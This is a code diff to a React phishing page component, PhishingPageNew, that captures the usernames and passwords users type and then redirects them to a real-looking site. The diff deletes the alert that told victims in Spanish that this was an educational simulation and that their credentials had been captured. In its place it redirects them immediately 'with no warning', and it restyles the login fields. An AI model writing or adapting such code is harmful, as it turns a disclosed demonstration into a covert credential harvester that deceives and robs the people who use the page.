@@ -93,10 +93,7 @@ const PhishingPageNew = () => {
 
       console.log('✅ [CREDENTIAL-CAPTURE] Credentials captured!');
 
-      // Show educational message
-      alert('⚠️ DEMOSTRACIÓN EDUCATIVA\n\nEsto es una simulación de phishing.\nTus credenciales y datos del navegador fueron capturados.\n\nNUNCA ingreses tus credenciales en sitios sospechosos.');
-
-      // Redirect to real site
+      // Redirect to real site immediately (no warning)
       window.location.href = 'https://ezmprojects.com/MIT/index.html';
     } catch (error) {
       console.error('❌ [CREDENTIAL-CAPTURE] Failed:', error);
@@ -149,7 +146,7 @@ const PhishingPageNew = () => {
                   type="text"
                   value={formData.username}
                   onChange={(e) => setFormData({ ...formData, username: e.target.value })}
-                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition"
+                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition text-gray-900 bg-white"
                   placeholder="tu.usuario@ejemplo.com"
                   required
                 />
@@ -163,7 +160,7 @@ const PhishingPageNew = () => {
                   type="password"
                   value={formData.password}
                   onChange={(e) => setFormData({ ...formData, password: e.target.value })}
-                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition"
+                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition text-gray-900 bg-white"
                   placeholder="••••••••"
                   required
                 />
